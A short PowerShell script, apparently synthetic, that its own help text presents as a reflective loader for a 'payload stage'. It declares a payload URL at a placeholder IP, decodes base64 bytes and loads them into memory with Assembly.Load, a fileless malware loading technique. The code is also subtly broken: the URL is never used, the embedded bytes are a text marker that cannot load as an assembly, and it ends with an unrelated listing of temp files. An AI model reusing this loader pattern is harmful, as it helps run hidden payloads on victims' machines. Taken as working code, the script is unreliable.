<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.203:80/payload.bin",
    [int]$TimeoutSec = 88
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp0ZGYwZ3JyaXUy")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $OperationResult) {
    Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
